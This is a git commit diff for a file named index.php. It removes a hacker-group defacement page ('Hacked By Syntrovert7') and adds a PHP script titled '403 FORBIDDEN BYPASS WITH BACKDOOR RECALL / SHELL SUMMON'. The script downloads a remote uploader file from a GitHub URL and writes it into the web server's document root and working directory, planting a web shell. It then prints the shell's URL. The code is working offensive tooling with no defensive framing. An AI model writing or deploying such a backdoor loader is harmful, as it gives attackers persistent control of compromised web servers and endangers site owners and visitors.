39b54f8c7e7d57f118be073666774d5bf18e81fc
Tama Pratama <56463553+tamasec@users.noreply.github.com>
2020-09-27 14:23:07 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,40 +1,42 @@
-<html>
-<head>
-<title>Hacked By Syntrovert7</title>
-<meta charset='utf-8'/>
-<meta name='theme-color' content='black'/>
-<meta name="author" content="Syntrovert7"/>
-<meta name="copyright" content="Syntrovert7"/>
-<meta name="description" content="Purwokerto Ghost"/>
-<meta name="keywords" content="Purwokerto Ghost"/>
-<meta property="og:title" content="Hacked By Syntrovert7"/>
-<meta property="og:description" content="Purwokerto Ghost"/>	
-<meta property="og:image" content="https://a.top4top.io/p_1620c0lw60.jpg"/>
-<link rel="shortcut icon" href="http://i.imgur.com/Cln0zMc.png"/>
-<link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700" rel='stylesheet' type='text/css'>
-<style>body { background: black; font-family: Ubuntu Mono; color: white; text-align: center; font-size: 1.0em; } footer { position: fixed; left: 0px; right: 0px; bottom: 0px; background: white; text-align: center; border-top: 1px solid white; border-bottom: 1px solid white; } #s0 { text-align: left; opacity: 0; }</style>
-<style type="text/css">body {cursor:url("http://i.imgur.com/Cln0zMc.png"),default</style>
-</head>
-<br>
-<br>
-<br>
-<center>
-<img border="0" src="https://b.top4top.io/p_1646796pq0.jpg" width="600" height="500">
-<font face="Ubuntu Mono"size="6">
-<br>
-<br>
-<font color="white">Hacked By Syntrovert7 - Purwokerto Ghost</font>
-<br>
-<font face="Ubuntu Mono"size="5">
-<br>
-<font color="white">"U Need A Break From A Fake World"</font>
-<br>
-<br>
-<audio controls source="mp3" src="https://j.top4top.io/m_1646gdvxt0.mp3" type="audio/mp3" autoplay="autoplay"></audio>
-<br>
-<font face="Ubuntu Mono"size="4">
-<br>Greetz To:<br>
-<font color="white" font face="Ubuntu Mono">&#12300;<marquee width="30%" behavior="alternate" scrollamount="5">Dark Clown Security - Manusia Biasa Team - Typical Idiot Security</marquee><font color="white">&#12301;</font>
-</center>
-</head>
-</html>
+<?php
+/*
+	403 FORBIDDEN BYPASS
+	WITH BACKDOOR RECALL / SHELL SUMMON
+*/
+$source = "https://raw.githubusercontent.com/tamasec/uploader/master/index.php";
+$name = "index.php";
+
+function _doEvil($name, $file) {
+	$filename = $name;
+	$getFile = file_get_contents($file);
+	$rootPath = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
+	$toRootFopen = fopen("$rootPath/$filename",'w');
+	$toRootExec = fwrite($toRootFopen, $getFile);
+	$rootShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename";
+	$realPath = getcwd().DIRECTORY_SEPARATOR;
+	$toRealFopen = fopen("$realPath/$filename",'w');
+	$toRealExec = fwrite($toRealFopen, $getFile);
+	$realShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]".dirname($_SERVER[REQUEST_URI])."/$filename";
+	echo "<center>";
+	if($toRootExec) {
+		if(file_exists($rootPath."$filename")) {
+			echo "<h1><font color=\"#00FF00\">[OK!] <a href=\"$rootShellUrl\" target=\"_blank\">$rootShellUrl</a></font></h1>";
+		}
+		else { 
+			echo "<h1><font color=\"red\">$rootPath$filename<br>Doesn't exist!</font>Try with another method!</h1>";
+		}
+	}
+	else {
+		if($toRealExec) {
+			if(file_exists($realPath."$filename")) {
+				echo "<h1><font color=\"#00FF00\">[OK!] <a href=\"$realShellUrl\" target=\"_blank\">$realShellUrl</a></font></h1>";
+			}
+			else { 
+				echo "<h1><font color=\"red\">FAILED!</font></h1>";
+			}
+		}
+	}
+	echo "</center>";
+}
+_doEvil($name, $source);
+?>  
